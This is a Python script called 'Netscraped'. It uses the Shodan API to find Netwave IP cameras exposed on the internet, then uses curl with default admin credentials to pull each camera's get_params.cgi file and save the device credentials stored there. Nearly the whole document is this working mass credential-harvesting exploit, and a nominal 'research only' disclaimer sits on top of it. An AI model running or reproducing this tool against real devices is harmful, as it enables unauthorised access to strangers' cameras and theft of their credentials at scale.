#-- coding: utf8 --
#!/usr/bin/env python3
import os, sys, time
from pathlib import Path
import shodan

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")

logo = color.HEADER + '''

      ███╗   ██╗███████╗████████╗███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
      ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
      ██╔██╗ ██║█████╗     ██║   ███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██║  ██║
      ██║╚██╗██║██╔══╝     ██║   ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██║  ██║
      ██║ ╚████║███████╗   ██║   ███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██████╔╝
      ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═════╝ 
                                                              
                                       Author: @037
                                       Version: 1.0

####################################### DISCLAIMER ##########################################
| Netscraped is a tool used to obtain hundreds of vulnerable Netwave IP cameras and then    |
| finds all the credentials stored on the affected device. It does so by simply using cURL  |
| to grab "get_params.cgi" which contains all the credentials to the device. This tool also |
| uses Shodan.io API to find vulnerable Netwave based IP cameras. Use for research only.    |
#############################################################################################
                                                                                      
'''
print(logo)

if len(sys.argv) > 2:
    ip_address = (sys.argv[1]).rstrip()
    url = ip_address+':'+sys.argv[2]+'/get_params.cgi'
    if len(sys.argv) == 4:
        creds = 'admin'+sys.argv[3]
    else:
        creds = 'admin:'
    os.system('curl -s --max-time %s --output %s --user %s %s'%('30', './'+ip_address+'.txt', creds, url))
    print("[*] Fetched %s stored as %s.txt" % (url, ip_address))
    quit()
else:
    print("[*] Single server exploitation w/o Shodan: %s <IP> <PORT> <CREDENTIALS (Optional)>" % sys.argv[0])

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

source_file = 'netwave.txt'
vuln_file = 'get_params.cgi'
counter=0
timeout = 30

shodan_api = SHODAN_API_KEY

semicreds = input('[*] Enter hardcoded Netwave password (Default <blank>): ') or ''
creds = 'admin:'+semicreds

engage = input('[*] Ready to engage targets? <Y/n>: ').lower()
print('')
if engage.startswith('y'):
    output_dir = 'results'
    search_term = 'Content-Length:372'

    def src_file(shodan_api, source_file, search_term):
        api = shodan.Shodan(shodan_api)
        results = api.search(search_term)
        try:                
            with open(source_file,'a') as ras:
                for addr in results['matches']:
                    ras.write(str(addr['ip_str'])+':'+str(addr['port'])+'\n')
            ras.close()
        except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            sys.exit()

    
    def pawn(shodan_api,search_term,counter,source_file,vuln_file,creds,output_dir,timeout):    
        if(os.path.isdir('./'+output_dir)==False):
            os.makedirs(output_dir)
        
        if(os.path.isdir('./'+output_dir+'/error_responses')==False):
            os.makedirs(output_dir+'/error_responses')
        
        if(os.path.isfile('./'+source_file)==False):
            print('[*] File not found\n[~] Creating file using Shodan...')
            src_file(shodan_api, source_file, search_term)
        
        if(os.path.getsize(source_file)==0):
            print('[*] File is empty\n[*] Getting IP adddresses using Shodan...')
            src_file(shodan_api, source_file, search_term)
        
        with open(source_file,'r') as f:
                lines = f.readlines()
        while True:    
            try:
                server = lines[counter]
                server = server.rstrip()
                server = server.split(':')
                ip_addr = (server[0]+':'+server[1]).rstrip()            
                filename = (server[0]+'_'+server[1]+'.txt').rstrip()
                file_path = os.path.join(output_dir,filename)
                print('[+] %4s:  '%str(counter)+ip_addr)
                url = ip_addr+'/'+vuln_file

                os.system('curl -s --max-time %s --output %s --user %s %s'%(timeout, file_path, creds, url))
            
                err_path = os.path.join(output_dir+'/error_responses',filename)
                try:
                    if(os.path.getsize(file_path) < 3000):
                            os.rename(file_path, err_path)
                except:
                    pass
                counter=counter+1
            except KeyboardInterrupt:
                print('[*] Interrupted! , exiting..')
                f.close()
                sys.exit(0)
            except IndexError:
                print('')
                print('\n [*] Finished!')
                f.close()
                sys.exit(0)
            except:
                print('[*] Some error occurred!')
                raise
                f.close()
                sys.exit(0)
            
    if __name__ == "__main__":
        pawn(shodan_api,search_term,counter,source_file,vuln_file,creds,output_dir,timeout)